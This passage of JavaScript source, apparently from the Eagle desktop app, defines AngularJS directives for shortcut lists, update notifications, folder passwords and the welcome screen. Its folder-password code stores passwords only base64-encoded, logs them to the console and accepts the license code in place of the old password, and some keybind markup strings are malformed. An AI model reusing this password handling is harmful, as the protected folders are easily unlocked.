                openInFinder = `${i18n.__("shortcuts.action.openFinder")}`;
            }
            else {
                openInFinder = `${i18n.__("shortcuts.action.openExplorer")}`;
            }

            $scope.actionKeyword = "";

            $scope.filterActions = (action) => {
                if (!$scope.actionKeyword) return true;
                return action.name.indexOf($scope.actionKeyword) > -1;
            };

            $scope.updateResult = () => {
                $scope.searchResult = [];
                $scope.shortcuts.forEach((shortcut) => {
                    let actions = shortcut.actions.filter((action) => {
                        if (!$scope.actionKeyword) return true;
                        const str = `${action.name} ${action.keybinds.darwin} ${action.keybinds.win32}`.toLowerCase();
                        return str.indexOf($scope.actionKeyword.toLowerCase()) > -1;
                    });
                    if (actions.length > 0) {
                        $scope.searchResult.push({
                            name: shortcut.name,
                            actions: actions
                        });
                    }
                });
            };

            $scope.shortcuts = [
                {
                    name: i18n.__("shortcuts.function.common"),
                    actions: [
                        { name: `${i18n.__("shortcuts.action.searchInCurrent")}`, keybinds: { darwin: "<key>⌘</key><key>F</key>", win32: "<key>Ctrl</key><key>F</key>" } },
                        { name: `${i18n.__("shortcuts.action.searchInAll")}`, keybinds: { darwin: "<key>⌘</key><key>Alt</key><key>F</key>", win32: "<key>Ctrl</key><key>Alt</key><key>F</key>" } },
                        { name: `${i18n.__("shortcuts.action.copy")}`, keybinds: { darwin: "<key>⌘</key><key>C</key>", win32: "<key>Ctrl</key><key>C</key>" } },
                        { name: `${i18n.__("shortcuts.action.newFolder")}`, keybinds: { darwin: "<key>⌘</key><key>Shift</key><key>N</key>", win32: "<key>Ctrl</key><key>Shift</key><key>N</key>" } },
                        { name: `${i18n.__("shortcuts.action.renameFolder")}`, keybinds: { darwin: "<key>⌘</key><key>R</key> / <key>F2</key> / <key>Enter</key>", win32: "<key>Ctrl</key><key>R</key> / <key>F2</key> / <key>Enter</key>" } },
                        { name: `${i18n.__("shortcuts.action.removeFolder")}`, keybinds: { darwin: "<key>⌘</key><key>Delete</key>", win32: "<key>Del</key>" } },
                        { name: `${i18n.__("shortcuts.action.expandAllFolders")}`, keybinds: { darwin: `<key>*</key> / <key>⌘</key><key>Alt</key><key>${i18n.__("shortcuts.keybinds.click")}</key>`, win32: `<key>*</key> / <key>Ctrl</key><key>Alt</key><key>${i18n.__("shortcuts.keybinds.click")}</key>` } },
                        { name: `${i18n.__("shortcuts.action.remove")}`, keybinds: { darwin: "<key>⌘</key><key>Delete</key>", win32: "<key>Del</key>" } },
                        { name: `${i18n.__("shortcuts.action.switchFolder")}`, keybinds: { darwin: "<key>⌘</key><key>J</key>", win32: "<key>Ctrl</key> +J" } },
                        { name: `${i18n.__("shortcuts.action.batchSort")}`, keybinds: { darwin: "<key>⌘</key><key>Shift</key><key>J</key>", win32: "<key>Ctrl</key><key>Shift</key><key>J</key>" } },
                        { name: `${i18n.__("shortcuts.action.openDetail")}`, keybinds: { darwin: `<key>Enter</key> / <key>${i18n.__("shortcuts.keybinds.dblclick")}</key>`, win32: `<key>Enter</key> / <key>${i18n.__("shortcuts.keybinds.dblclick")}</key>` } },
                        { name: `${i18n.__("shortcuts.action.exitDetail")}`, keybinds: { darwin: `<key>ESC</key> / <key>${i18n.__("shortcuts.keybinds.dblclick")}</key>`, win32: `<key>ESC</key> / <key>${i18n.__("shortcuts.keybinds.dblclick")}</key>` } },
                        { name: `${i18n.__("shortcuts.action.pageDown")}`, keybinds: { darwin: "<key>Fn</key><key>↓</key>", win32: "Page Down" } },
                        { name: `${i18n.__("shortcuts.action.pageUp")}`, keybinds: { darwin: "<key>Fn</key><key>↑</key>", win32: "Page Up" } },
                        { name: `${i18n.__("shortcuts.action.fullscreen")}`, keybinds: { darwin: "<key>F5</key>", win32: "<key>F5</key>" } },
                        { name: `${i18n.__("shortcuts.action.zoomIn")}`, keybinds: { darwin: "<key>+</key> / <key>⌘</key><key>+</key>", win32: "<key>Ctrl</key><key>+</key>" } },
                        { name: `${i18n.__("shortcuts.action.zoomOut")}`, keybinds: { darwin: "<key>-</key> / <key>⌘</key><key>-</key>", win32: "<key>Ctrl</key><key>-</key>" } },
                        { name: `${i18n.__("shortcuts.action.batchRename")}`, keybinds: { darwin: "<key>⌘</key><key>R</key>", win32: "<key>Ctrl</key><key>R</key>" } },
                        { name: `${i18n.__("shortcuts.action.toggleAllSidebar")}`, keybinds: { darwinTab: "<key>Tab</key>", win32: "<key>Tab</key>" } },
                        { name: `${i18n.__("shortcuts.action.toggleFilter")}`, keybinds: { darwin: "<key>⌘</key><key>Shift</key><key>F</key>", win32: "<key>Ctrl</key><key>Shift</key><key>F</key>" } },
                    ]
                },
                {
                    name: i18n.__("shortcuts.function.sidebar"),
                    actions: [
                        { name: `${i18n.__("shortcuts.action.newFolder")}`, keybinds: { darwin: "<key>⌘</key><key>Shift</key><key>N</key>", win32: "<key>Ctrl</key><key>Shift</key><key>N</key>" } },
                        { name: `${i18n.__("shortcuts.action.newSmartFolder")}`, keybinds: { darwin: "<key>⌘</key><key>Shift</key><key>Alt</key><key>N</key>", win32: "<key>Ctrl</key><key>Shift</key><key>Alt</key><key>N</key>" } },
                        { name: `${i18n.__("shortcuts.action.switchFolder")}`, keybinds: { darwin: "<key>⌘</key><key>J</key>", win32: "<key>Ctrl</key><key>J</key>" } },
                        { name: `${i18n.__("shortcuts.action.arrangeUp")}`, keybinds: { darwin: "<key>⌘</key><key>]</key>", win32: "<key>Ctrl</key><key>]</key>" } },
                        { name: `${i18n.__("shortcuts.action.arrangeTop")}`, keybinds: { darwin: "<key>⌘</key><key>Shift</key><key>]</key>", win32: "<key>Ctrl</key><key>Shift</key><key>]</key>" } },
                        { name: `${i18n.__("shortcuts.action.arrangeDown")}`, keybinds: { darwin: "<key>⌘</key><key>[</key>", win32: "<key>Ctrl</key><key>[</key>" } },
                        { name: `${i18n.__("shortcuts.action.arrangeBottom")}`, keybinds: { darwin: "<key>⌘</key><key>Shift</key><key>[</key>", win32: "<key>Ctrl</key><key>Shift</key><key>[</key>" } },
                        { name: `${i18n.__("shortcuts.action.renameFolder")}`, keybinds: { darwin: "<key>⌘</key><key>R</key> / <key>F2</key> / <key>Enter</key>", win32: "<key>Ctrl</key><key>R</key> / <key>F2</key> / <key>Enter</key>" } },
                        { name: `${i18n.__("shortcuts.action.renameSmartFolder")}`, keybinds: { darwin: "<key>⌘</key><key>R</key> / <key>F2</key> / <key>Enter</key>", win32: "<key>Ctrl</key><key>R</key> / <key>F2</key> / <key>Enter</key>" } },
                        { name: `${i18n.__("shortcuts.action.removeFolder")}`, keybinds: { darwin: "<key>⌘</key><key>Delete</key>", win32: "<key>Del</key>" } },
                        { name: `${i18n.__("shortcuts.action.autoTag")}`, keybinds: { darwin: "<key>⌘</key><key>Shift</key><key>R</key>", win32: "<key>Ctrl</key><key>Shift</key><key>R</key>" } },
                        { name: `${i18n.__("shortcuts.action.toggleSidebar")}`, keybinds: { darwin: "<key>⌘</key><key>Alt</key><key>2</key>", win32: "<key>Ctrl</key><key>Alt</key><key>2</key>" } },
                    ]
                },
                {
                    name: i18n.__("shortcuts.function.inspector"),
                    actions: [
                        { name: `${i18n.__("shortcuts.action.openLink")}`, keybinds: { darwin: "<key>⌘</key><key>Shift</key><key>O</key>", win32: "<key>Ctrl</key><key>Shift</key><key>O</key>" } },
                        { name: `${i18n.__("shortcuts.action.starRating")}`, keybinds: { darwin: "<key>1-5</key>", win32: "<key>1-5</key>" } },
                        { name: `${i18n.__("shortcuts.action.removeRating")}`, keybinds: { darwin: "<key>0</key>", win32: "<key>0</key>" } },
                        { name: `${i18n.__("shortcuts.action.toggleInspector")}`, keybinds: { darwin: "<key>⌘</key><key>Alt</key><key>1</key>", win32: "<key>Ctrl</key><key>Alt</key><key>1</key>" } },
                    ]
                },
                {
                    name: i18n.__("shortcuts.function.list"),
                    actions: [
                        { name: `${i18n.__("shortcuts.action.copy")}`, keybinds: { darwin: "<key>⌘</key><key>C</key>", win32: "<key>Ctrl</key><key>C</key>" } },
                        { name: `${i18n.__("shortcuts.action.copyPath")}`, keybinds: { darwin: "<key>⌘</key><key>⌥</key><key>C</key>", win32: "<key>Ctrl</key><key>Alt</key><key>C</key>" } },
                        { name: `${i18n.__("shortcuts.action.remove")}`, keybinds: { darwin: "<key>⌘</key><key>Delete</key>", win32: "<key>Del</key>" } },
                        { name: `${i18n.__("shortcuts.action.removeFromFolder")}`, keybinds: { darwin: "<key>⌘</key><key>Shift</key><key>Delete</key>", win32: "<key>Shift</key>Del" } },
                        { name: `${i18n.__("shortcuts.action.selectNext")}`, keybinds: { darwin: "<key>→</key> <key>D</key>", win32: "<key>→</key> <key>D</key>" } },
                        { name: `${i18n.__("shortcuts.action.selectPrev")}`, keybinds: { darwin: "<key>←</key> <key>A</key>", win32: "<key>←</key> <key>A</key>" } },
                        { name: `${i18n.__("shortcuts.action.selectUp")}`, keybinds: { darwin: "<key>↑</key> <key>W</key>", win32: "<key>↑</key> <key>W</key>" } },
                        { name: `${i18n.__("shortcuts.action.selectDown")}`, keybinds: { darwin: "<key>↓</key> <key>S</key>", win32: "<key>↓</key> <key>S</key>" } },
                        { name: `${i18n.__("shortcuts.action.pageDown")}`, keybinds: { darwin: "<key>Fn</key><key>↓</key>", win32: "<key>Page Down</key>" } },
                        { name: `${i18n.__("shortcuts.action.pageUp")}`, keybinds: { darwin: "<key>Fn</key><key>↑</key>", win32: "<key>Page Up</key>" } },
                        { name: `${i18n.__("shortcuts.action.openDetail")}`, keybinds: { darwin: "<key>Enter</key> / <key双击</key>", win32: "<key>Enter</key> / <key双击</key>" } },
                        { name: `${i18n.__("shortcuts.action.exitDetail")}`, keybinds: { darwin: "<key>ESC</key> / <key双击</key>", win32: "<key>ESC</key> / <key双击</key>" } },
                        { name: `${i18n.__("shortcuts.action.zoomIn")}`, keybinds: { darwin: "<key>⌘</key><key>=</key>", win32: "<key>Ctrl</key><key>=</key>" } },
                        { name: `${i18n.__("shortcuts.action.zoomOut")}`, keybinds: { darwin: "<key>⌘</key><key>-</key>", win32: "<key>Ctrl</key><key>-</key>" } },
                        { name: openInFinder, keybinds: { darwin: "<key>⌘</key><key>O</key> / <key>⌘</key><key双击</key>", win32: "<key>Ctrl</key><key>O</key> / <key>Ctrl</key><key双击</key>" } },
                        { name: `${i18n.__("shortcuts.action.openFinder")}`, keybinds: { darwin: "<key>⌘</key><key>Enter</key>", win32: "<key>Ctrl</key><key>Enter</key>" } },
                        { name: `${i18n.__("shortcuts.action.batchRename")}`, keybinds: { darwin: "<key>⌘</key><key>R</key>", win32: "<key>Ctrl</key><key>R</key>" } },
                        { name: `${i18n.__("shortcuts.action.copyTag")}`, keybinds: { darwin: "<key>⌘</key><key>Shift</key><key>C</key>", win32: "<key>Ctrl</key><key>Shift</key><key>C</key>" } },
                        { name: `${i18n.__("shortcuts.action.pasteTag")}`, keybinds: { darwin: "<key>⌘</key><key>Shift</key><key>V</key>", win32: "<key>Ctrl</key><key>Shift</key><key>V</key>" } },
                        { name: `${i18n.__("shortcuts.action.toggleListName")}`, keybinds: { darwin: "<key>⌘</key><key>Alt</key><key>4</key>", win32: "<key>Ctrl</key><key>Alt</key><key>4</key>" } },
                        { name: `${i18n.__("shortcuts.action.toggleListMeta")}`, keybinds: { darwin: "<key>⌘</key><key>Alt</key><key>5</key>", win32: "<key>Ctrl</key><key>Alt</key><key>5</key>" } },
                        { name: `${i18n.__("shortcuts.action.toggleListAnnotation")}`, keybinds: { darwin: "<key>⌘</key><key>Alt</key><key>6</key>", win32: "<key>Ctrl</key><key>Alt</key><key>6</key>" } },
                        { name: `${i18n.__("shortcuts.action.toggleSubfolder")}`, keybinds: { darwin: "<key>⌘</key><key>Alt</key><key>7</key>", win32: "<key>Ctrl</key><key>Alt</key><key>7</key>" } },
                        { name: `${i18n.__("shortcuts.action.batchSort")}`, keybinds: { darwin: "<key>⌘</key><key>Shift</key><key>J</key>", win32: "<key>Ctrl</key><key>Shift</key><key>J</key>" } },
                        { name: `${i18n.__("shortcuts.action.multipleSelect")}`, keybinds: { darwin: "<key>Shift</key><key>↑</key><key>↓</key><key>←</key><key>→</key>", win32: "<key>Shift</key><key>↑</key><key>↓</key><key>←</key><key>→</key>" } },
                    ]
                },
                {
                    name: i18n.__("shortcuts.function.detail"),
                    actions: [
                        { name: `${i18n.__("shortcuts.action.selectNext")}`, keybinds: { darwin: "<key>→</key> <key>D</key>", win32: "<key>→</key> <key>D</key>" } },
                        { name: `${i18n.__("shortcuts.action.selectPrev")}`, keybinds: { darwin: "<key>←</key> <key>A</key>", win32: "<key>←< <key>A</key>/key>" } },
                        { name: `${i18n.__("shortcuts.action.exitDetail")}`, keybinds: { darwin: "<key>ESC</key> / <key>Enter</key>", win32: "<key>ESC</key> / <key>Enter</key>" } },
                        { name: `${i18n.__("shortcuts.action.justifiedSize")}`, keybinds: { darwin: "<key>⌘</key><key>9</key>", win32: "<key>Ctrl</key><key>9</key>" } },
                        { name: `${i18n.__("shortcuts.action.actualSize")}`, keybinds: { darwin: "<key>⌘</key><key>0</key>", win32: "<key>Ctrl</key><key>0</key>" } },
                        { name: `${i18n.__("shortcuts.action.zoomIn")}`, keybinds: { darwin: `<key>⌘</key><key>=</key> / <key>Alt</key><key>${i18n.__("shortcuts.keybinds.scroll")}</key>`, win32: `<key>Ctrl</key><key>=</key> / <key>Alt</key><key>${i18n.__("shortcuts.keybinds.scroll")}</key>` } },
                        { name: `${i18n.__("shortcuts.action.zoomOut")}`, keybinds: { darwin: `<key>⌘</key><key>-</key> / <key>Alt</key><key>${i18n.__("shortcuts.keybinds.scroll")}</key>`, win32: `<key>Ctrl</key><key>-</key> / <key>Alt</key><key>${i18n.__("shortcuts.keybinds.scroll")}</key>` } },
                    ]
                },
                {
                    name: i18n.__("shortcuts.function.videoPlayer"),
                    actions: [
                        { name: `${i18n.__("shortcuts.action.videoPause")}`, keybinds: { darwin: `<key>${i18n.__("shortcuts.keybinds.spacebar")}</key>`, win32: `<key>${i18n.__("shortcuts.keybinds.spacebar")}</key>` } },
                        { name: `${i18n.__("shortcuts.action.volumnUp")}`, keybinds: { darwin: "<key>⌘</key><key>↑</key>", win32: "<key>Ctrl</key><key>↑</key>" } },
                        { name: `${i18n.__("shortcuts.action.volumnDown")}`, keybinds: { darwin: "<key>⌘</key><key>↓</key>", win32: "<key>Ctrl</key><key>↓</key>" } },
                        { name: `${i18n.__("shortcuts.action.videoForward")}`, keybinds: { darwin: "<key>⌘</key><key>→</key>", win32: "<key>Ctrl</key><key>→</key>" } },
                        { name: `${i18n.__("shortcuts.action.videoBackward")}`, keybinds: { darwin: "<key>⌘</key><key>←</key>", win32: "<key>Ctrl</key><key>←</key>" } },
                        { name: `${i18n.__("shortcuts.action.videoNext")}`, keybinds: { darwin: "<key>→</key> <key>D</key>", win32: "<key>→</key> <key>D</key>" } },
                        { name: `${i18n.__("shortcuts.action.videoPrev")}`, keybinds: { darwin: "<key>←</key> <key>A</key>", win32: "<key>←</key> <key>A</key>" } },
                        { name: `${i18n.__("shortcuts.action.fullscreen")}`, keybinds: { darwin: "<key>F5</key>", win32: "<key>F5</key>" } },
                    ]
                },
            ];

            $scope.searchResult = $scope.shortcuts;

            $scope.$on("OPEN_SHORTCUTS", () => {
                    $scope.isOpen = true;
                });

            $scope.close = () => {
                $scope.isOpen = false;
            };
        }
    }
});
EagleApp.directive('notificationModal', function ($timeout, $rootScope, $filter) {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/notification-modal.html',
        scope: {
            theme: '=theme'
        },
        link: function ($scope, element, attrs, controllersArr) {
            $scope.isOpen = false;
            $scope.shortcutsScope = $scope;

            $scope.getPageUrl = () => {
                switch (preferences.general.language) {
                    case 'zh_CN':
                        return `https://cn.eagle.cool/app-notifications?theme=${$bodyScope.theme}&version=${encodeURIComponent($bodyScope.appVersion)}&buildVersion=${encodeURIComponent($bodyScope.buildVersion)}`;
                        break;
                    case 'zh_TW':
                        return `https://tw.eagle.cool/app-notifications?theme=${$bodyScope.theme}&version=${encodeURIComponent($bodyScope.appVersion)}&buildVersion=${encodeURIComponent($bodyScope.buildVersion)}`;
                        break;
                    case 'ja_JP':
                        return `https://jp.eagle.cool/app-notifications?theme=${$bodyScope.theme}&version=${encodeURIComponent($bodyScope.appVersion)}&buildVersion=${encodeURIComponent($bodyScope.buildVersion)}`;
                        break;
                    default:
                        return `https://en.eagle.cool/app-notifications?theme=${$bodyScope.theme}&version=${encodeURIComponent($bodyScope.appVersion)}&buildVersion=${encodeURIComponent($bodyScope.buildVersion)}`;
                }
            };

            $scope.$on("OPEN_NOTIFICATION", () => {
                $scope.isOpen = true;
            });

            $scope.close = () => {
                $scope.isOpen = false;
            };
        }
    }
});
EagleApp.directive('newVersionNotificationModal', ($timeout, $rootScope, $filter, PluginCenterFactory) => {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/new-version-notification-modal.html',
        scope: {
            theme: '=theme'
        },
        link: ($scope, element, attrs, controllersArr) => {

            const preferences = electronSettings.getSync('preferences');
            const ipcRenderer = require('electron').ipcRenderer;
            const pjson = require(appRoot + '/package.json');

            $scope.autoUpdateScope = $scope;
            $scope.isOpen = false;
            $scope.result;
            rootScope = angular.element("body").scope();

            // 收到更新通知
            ipcRenderer.on("show-update-message", (event, result) => {

                console.log(result);

                $scope.detail = result.content;
                $scope.size = 0;
                $scope.version = result.version;
                $scope.currentVersion = pjson.prerelease || pjson.version;
                $scope.result = result;

                var language = preferences.general.language;

                switch (language) {
                    case 'zh_TW':
                        $scope.detail = result.contentZH || result.content;
                        break;
                    case 'zh_CN':
                        $scope.detail = result.contentCN || result.content;
                        break;
                    case 'ja_JP':
                        $scope.detail = result.contentJP || result.content;
                        break;
                    default:
                        $scope.detail = result.content;
                }

                if (process.platform == 'darwin') { $scope.size = result.file.size; }
                else { $scope.size = result.windows.size; }

                $scope.isOpen = true;
                $scope.$evalAsync();
            });

            $scope.download = () => {
                if (process.platform == 'darwin') {
                    require('electron').shell.openExternal("https:" + $scope.result.dmg.url);
                }
                else {
                    require('electron').shell.openExternal("https:" + $scope.result.windows.url);
                }
            };

            $scope.cancel = () => {
                if (localStorage) {
                    localStorage["lastCheckForUpdateTime"] = Date.now();
                }
                $scope.close();
            };

            $scope.close = () => {
                $scope.isOpen = false;
            };
        }
    }
});
EagleApp.directive('folderPasswordModal', function ($timeout, $rootScope, $filter) {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/folder-password-modal.html',
        scope: {
            theme: '=theme'
        },
        link: function ($scope, element, attrs, controllersArr) {

            const $bodyScope = angular.element("body").scope();

            $scope.folderPwdScope = $scope;
            $scope.isOpen = false;
            $scope.mode = "change";    // new change reset
            $scope.folder;

            $scope.oldPassword = "";
            $scope.newPassword = "";
            $scope.newRePassword = "";
            $scope.passwordTips = "";

            $scope.$on("SET-FOLDER-PASSWORD", (e, params) => {

                $scope.folder = params.folder;
                $scope.mode = params.mode;
                $scope.isOpen = true;

                $timeout(() => {
                    $(".folder-password-modal input:visible").eq(0).focus();
                }, 300);
            });

            function setNewPassword() {
                var newPassword = $scope.newPassword;
                var newRePassword = $scope.newRePassword;
                var passwordTips = $scope.passwordTips;
                if (newPassword && newRePassword && newPassword === newRePassword) {
                    var endcodePassword = window.btoa(newPassword);
                    $scope.folder.password = endcodePassword;
                    $scope.folder.isUnlock = false;
                    $scope.folder.passwordTips = passwordTips;
                    console.log(endcodePassword);
                    $bodyScope.updateSidebarList();
                    $bodyScope.calculateImageBinding({ ignoreSort: true }, () => {
                        $bodyScope.rebindRefresh();
                    });
                    $bodyScope.saveFolder();
                    close();
                    electronLog && electronLog.info(`[app] 设置文件夹密码：${$scope.folder.name}(${$scope.folder.id})`);
                }
                else {
                    // 界面提示缺少
                    $("#new-folder-password-input").focus();
                    $("#new-folder-password-input").addClass("animation--shake-horizontal constant");
                    setTimeout(() => {
                        $("#new-folder-password-input").removeClass("animation--shake-horizontal constant");
                    }, 350);
                }
            };

            function chnagePassword() {
                var oldPassword = $scope.oldPassword;
                var newPassword = $scope.newPassword;
                var newRePassword = $scope.newRePassword;
                var passwordTips = $scope.passwordTips;
                // 判断是否有填写
                if (oldPassword && newPassword && newRePassword && newPassword === newRePassword) {
                    // 新旧密码验证
                    if (
                        oldPassword === window.atob($scope.folder.password) ||
                        oldPassword && oldPassword === Registration?.license?.code
                    ) {
                    // if (window.atob($scope.folder.password) === oldPassword) {
                        var endcodePassword = window.btoa(newPassword);
                        $scope.folder.password = endcodePassword;
                        $scope.folder.isUnlock = false;
                        $scope.folder.passwordTips = passwordTips;
                        $bodyScope.calculateImageBinding({ ignoreSort: true }, () => {
                            $bodyScope.rebindRefresh();
                        });
                        $bodyScope.saveFolder();
                        close();
                        electronLog && electronLog.info(`修改文件夹密码：${$scope.folder.name}(${$scope.folder.id})`);
                    }
                    // 界面提示密码错误
                    else {
                        $("#change-folder-password-input").focus();
                        $("#change-folder-password-input").addClass("animation--shake-horizontal constant");
                        setTimeout(() => {
                            $("#change-folder-password-input").removeClass("animation--shake-horizontal constant");
                        }, 350);
                    }
                }
                else {
                    // 界面提示缺少
                }
            };

            function resetPassword() {
                var oldPassword = $scope.oldPassword;
                try {
                    if (Registration?.license?.email) {
                        email = Registration.license.email;
                    }
                } catch (err) { }

                // 判断是否有填写
                if (
                    oldPassword && oldPassword === window.atob($scope.folder.password) ||
                    oldPassword && oldPassword === Registration?.license?.code
                ) {
                    delete $scope.folder.password;
                    delete $scope.folder.isUnlock;
                    delete $scope.folder.passwordTips;
                    $bodyScope.updateSidebarList();
                    $bodyScope.calculateImageBinding({ ignoreSort: true }, () => {
                        $bodyScope.rebindRefresh();
                    });
                    $bodyScope.saveFolder();
                    close();
                    electronLog && electronLog.info(`移除文件夹密码：${$scope.folder.name}(${$scope.folder.id})`);
                }
                else {
                    $("#reset-folder-password-input").focus();
                    $("#reset-folder-password-input").addClass("animation--shake-horizontal constant");
                    setTimeout(() => {
                        $("#reset-folder-password-input").removeClass("animation--shake-horizontal constant");
                    }, 350);
                }
            };

            $scope.save = () => {
                switch ($scope.mode) {
                    case 'new':
                        setNewPassword();
                        break;
                    case 'change':
                        chnagePassword();
                        break;
                    case 'reset':
                        resetPassword();
                        break;
                }
            };

            $scope.cancel = () => {
                close();
            };

            function close() {
                $scope.isOpen = false;
                $timeout(() => {
                    $scope.oldPassword = "";
                    $scope.newPassword = "";
                    $scope.newRePassword = "";
                    $scope.passwordTips = "";
                }, 200);
            };
        }
    }
});
EagleApp.directive('mousewheelSettingModal', function($timeout, $rootScope, $filter) {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/mousewheel-setting-modal.html',
        scope: {
            theme: '=theme'
        },
        link: ($scope) => {
            $scope.mode = "zoom";
            $scope.isOpen = false;

            $scope.$on("OPEN_MOUSEWHEEL_PREFERENCE_WINDOW", function () {
                $scope.isOpen = true;
                $scope.$evalAsync();
            });

            $scope.changeMode = function (mode) {
                $scope.mode = mode;		
            };

            $scope.save = function () {
                $scope.isOpen = false;
                $rootScope.preferences.habits.scrollBehaviorTour = true;
                $rootScope.preferences.habits.scrollBehavior = $scope.mode;
                ipcRenderer.send("chnage-scrollBehavior", $scope.mode);
            };
        }
    }
});
EagleApp.directive('aboutPanel', function($timeout, $rootScope, $filter) {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/about-panel.html',
        scope: {
            theme: '=theme'
        },
        link: function ($scope, element, attrs, controllersArr) {

            const pjson = require(appRoot + '/package.json');         // 0.54 ms
            $scope.pjson = pjson;
            $scope.appVersion = pjson.version;
            $scope.buildVersion = pjson.buildVersion;
            $scope.buildNumber = pjson.buildNumber;

            $scope.$on("OPEN_ABOUT_PANEL", function (event, params) {
                $("#about-panel").addClass("open");
            });
            $scope.close = function () {
                $("#about-panel").removeClass("open");
            };
        }
    }
});
EagleApp.directive('welcomePage', ($timeout, $rootScope, $filter) => ({
    restrict: 'E',
    templateUrl: 'js/directives/welcome-page.html',
    scope: {
        theme: '=theme'
    },
    link: function ($scope, element, attrs, controllersArr) {

        const ipcRenderer = electron.ipcRenderer;
        $scope.platform = process.platform;
        $scope.isOpen = false;
        $scope.welcomeStep = 0;
        $scope.currentTheme = $scope?.theme?.toUpperCase() || 'DARK';
        $scope.totalSteps = [1, 2, 3, 4];
        $scope.$body = angular.element(document.body).scope();

        $scope.selectTheme = (theme) => {
            $scope.currentTheme = theme;
            $("#welcome-page").addClass("theme-changing");
            setTimeout(() => {
                $("#welcome-page").removeClass("theme-changing");
            }, 500);
            ipcRenderer.send('change-theme', {
                name: theme,
                css: theme.toLowerCase(),
            });
        };

        $scope.gotoStep = (step) => {
            $scope.welcomeStep = step;
        };

        $scope.next = () => {
            $scope.welcomeStep++;
            if ($scope.welcomeStep > $scope.totalSteps.length) {
                $scope.welcomeStep = $scope.totalSteps.length;
            }
        };

        $scope.prev = () => {
            $scope.welcomeStep--;
            if ($scope.welcomeStep < 1) {
                $scope.welcomeStep = 1;
            }
        }; 

        ipcRenderer.on('app-status-welcome', (e, params) => {
            
            currentWindow.setMinimumSize(1024, 768);

            $scope.isOpen = true;
            $("body").addClass("is-welcome-page");    

            // 资源库路径遗失，显示提示
            if (params && params.libraryMissed) {
                var libraryPath = params.libraryPath;
                $scope.welcomeStep = 5;
                $scope.libraryPath = libraryPath;
                $scope.isLibraryMissed = true;
                $scope.libraryName = path.basename(libraryPath);
            }
            else {
                $timeout(() => {
                    $scope.welcomeStep = 1;
                }, 500);
            }
            
            $scope.$evalAsync();
        });

        ipcRenderer.on('app-status-library-dirs-loaded', (e, count) => {
            $("body").removeClass("is-welcome-page");
            currentWindow.setMinimumSize(500, 375);
            $scope.isOpen = false;
            $scope.$evalAsync();
        });

        ipcRenderer.on('app-status-library-cache-loaded', (e) => {
            $("body").removeClass("is-welcome-page");
            currentWindow.setMinimumSize(500, 375);
            $scope.isOpen = false;
            $scope.$evalAsync();
        });
    }
}));
EagleApp.directive('cornerBtns', ($timeout, $rootScope, $filter) => {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/corner-btns.html', 
        scope: {
            theme: "=theme",
            isAlwaysOnTop: "=isAlwaysOnTop"
        },
        link: ($scope, element, attrs, controllersArr) => {

            if (attrs.hideAlwaysOnTop) {
                $scope.hideAlwaysOnTop = true;
            }

            $scope.minimize = () => {
                currentWindow.minimize();
            };
            
            $scope.maximize = () => {
                if (currentWindow.isFullScreen()) {
                    currentWindow.setFullScreen(false);
                } else if (!currentWindow.isMaximized()) {
                    currentWindow.maximize();
                    $bodyScope.isMaximize = true;
                } else {
                    currentWindow.unmaximize();
                    $bodyScope.isMaximize = false;
                }
            };
            
            $scope.restore = () => {
                if (currentWindow.isFullScreen()) {
                    currentWindow.setFullScreen(false);
                } else if (!currentWindow.isMaximized()) {
                    currentWindow.maximize();
                    $bodyScope.isMaximize = true;
                } else {
                    currentWindow.unmaximize();
                    $bodyScope.isMaximize = false;
                }
            };
            
            $scope.close = () => {
                currentWindow.close();
            };

            $scope.toggleAlwaysOnTop = () => {
                $bodyScope.toggleAlwaysOnTop();
            };
        }
    };
});
EagleApp.directive('emptyTrashProgress', ($timeout, $rootScope, $filter) => {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/empty-trash-progress.html', 
        link: ($scope, element, attrs, controllersArr) => {

        }
    };
});
class LoadProgress {
    
    $scope = null;
    status = null;
    isOpen = true;
    libraryDiffCurr = 0;
    libraryDiffCount = 0;
    libraryTotal = 0;
    currentLoaded = 0;
    progress = 0;
    loadLibraryStartTime = 0;
    loadLibraryTimeLeftInSeconds = 0;

    constructor($scope) {
        this.$scope = $scope;
        this.init();
        this.initIPC();
        this.status = LoadProgress.STATUS.INIT;
    }

    static get STATUS() {
        return {
            INIT: 'init',
            MODULE_LOADING: 'module-loading',       // .NET Framework 載入中
            MODULE_LOADED: 'module-loaded',         // .NET Framework 載入完成
            LIBRARY_LOADING: 'library-loading',     // Library 開始載入
            DIR_LOADING: 'dir-loading',             // Library images 資料夾列表載入中
            DIR_LOADED: 'dir-loaded',               // Library images 資料夾列表載入完成
            METADATA_LOADING: 'metadata-loading',   // Library Metadata 載入中
            METADATA_LOADED: 'metadata-loaded',     // Library Metadata 載入完成
            CACHE_LOADING: 'cache-loading',         // Library Cache 載入中
            CACHE_LOADED: 'cache-loaded',           // Library Cache 載入完成
            LIBRARY_LOADED: 'library-loaded',       // Library 載入完成
        }
    }

    init() {
        this.isOpen = true;
        this.libraryDiffCurr = 0;
        this.libraryDiffCount = 0;
        this.libraryTotal = 0;
        this.currentLoaded = 0;
        this.progress = 0;
        this.loadLibraryStartTime = 0;
        this.loadLibraryTimeLeftInSeconds = 0;
    }

    open() {
        this.isOpen = true;
    }

    close() {
        setTimeout(() => {
            this.isOpen = false;
            this.$scope.$evalAsync();
        }, 50);
    }

    initIPC() {

        // app-status-module-loading
        ipcRenderer.on('app-status-module-loading', (e, params) => {
            this.status = LoadProgress.STATUS.MODULE_LOADING;
            this.$scope.$evalAsync();
        });

        // app-status-module-loaded
        ipcRenderer.on('app-status-module-loaded', (e, params) => {
            this.status = LoadProgress.STATUS.MODULE_LOADED;
            this.$scope.$evalAsync();
        });
        
        ipcRenderer.on('app-status-welcome', (e, params) => {
            this.close();
            this.$scope.$evalAsync();
        });

        // 剛開始載入資源庫
        ipcRenderer.on('app-status-loading', (e) => {
            this.init();
            this.open();
            this.status = LoadProgress.STATUS.LIBRARY_LOADING;
            this.$scope.$evalAsync();
        });

        ipcRenderer.on('checking-library-cache', (e, total) => {
            if (!total || total <= 0) return;
            this.libraryDiffCurr = 0;
            this.libraryDiffCount = total;
            this.$scope.$evalAsync();
        });

        ipcRenderer.on('checking-library-cache-increase', (e) => {
            this.libraryDiffCurr += 10;
            if (this.libraryDiffCurr >= this.libraryDiffCount) {
